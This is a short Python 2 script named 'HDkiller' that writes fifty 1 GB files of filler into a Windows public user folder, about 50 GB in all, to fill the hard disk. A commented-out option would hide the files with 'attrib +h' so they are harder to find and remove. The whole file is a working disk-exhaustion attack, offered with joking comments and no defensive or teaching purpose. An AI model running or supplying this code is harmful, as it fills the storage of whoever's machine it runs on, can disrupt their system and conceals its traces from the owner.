import os,random,sys

def HDkiller():
    print "urdon m8"
    identificatore="ID"+str(random.randrange(1,10011)) 
    f = open("C:\\Users\\Public\\"+identificatore+".kek", "wb")  #win or linux path
    f.write("a" * 1073741824)#put size here
    f.close()
    #cmd=os.popen("attrib +h "+fn) if you want hide the files uncomment here (only windows now)
   # cmd.close()



for x in range(0, 50): #50 times = 50 GBs :D 
    print "\n"
    print x
    HDkiller()
